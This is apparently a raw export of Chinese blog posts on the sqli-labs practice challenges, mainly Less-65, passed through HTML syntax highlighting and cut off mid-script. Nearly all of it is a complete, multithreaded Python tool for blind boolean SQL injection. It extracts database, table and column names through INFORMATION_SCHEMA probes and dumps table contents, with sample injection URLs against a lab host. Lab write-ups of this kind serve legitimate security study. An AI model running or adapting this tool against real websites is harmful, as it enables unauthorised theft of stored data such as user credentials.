class=\"keyword\">in</span> html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_db_len</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT LENGTH(database())),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前数据库长度: %d'</span> % lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cu_db_name</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    lenth = get_db_len(url)</span><br><span class=\"line\">    dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" and ascii(substr((select database()),%d,1))\"</span> % (i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        dbname += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[*]'</span>, dbname)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d--+\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url)</span><br><span class=\"line\">    lenth = get_all_db_len(url, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span class=\"params\">(url, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + \\</span><br><span class=\"line\">                <span class=\"string\">\" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % (</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--current-db'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'cudbs'</span>, help=<span class=\"string\">'Retrieve DBMS current database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.cudbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        get_cu_db_name(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n"},{"title":"sqli-labs lession-65 GET-盲注-变化4-仅允许130次请求","date":"2018-11-29T06:05:45.000Z","_content":"\n# sqli-labs lession-65 GET-盲注-变化4-仅允许130次请求\n\n---\n\n## 注入\n\n`http://10.60.17.35:8082/Less-65/?id=1\")+and+1=2%23`\n\n`http://10.60.17.35:8082/Less-65/?id=1\")+and+1=1%23`\n\n## 脚本\n\n![001](/img/sql/Lesson-65/001.png)\n\n![002](/img/sql/Lesson-65/002.png)\n\n![003](/img/sql/Lesson-65/003.png)\n\n![004](/img/sql/Lesson-65/004.png)\n\n```\n#python3\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nfeature = 'Your Login name'\nhead = '\")'\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef binary_search_db(url, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).text\n            if feature in html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n# 获取当前数据库长度\n\n\ndef get_db_len(url):\n    payload = head + \\\n        \" AND ORD(MID((SELECT LENGTH(database())),%d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前数据库长度: %d' % lenth)\n    return lenth\n\n# 获取当前数据库名\n\n\ndef get_cu_db_name(url):\n    lenth = get_db_len(url)\n    dbname = \"\"\n    for i in 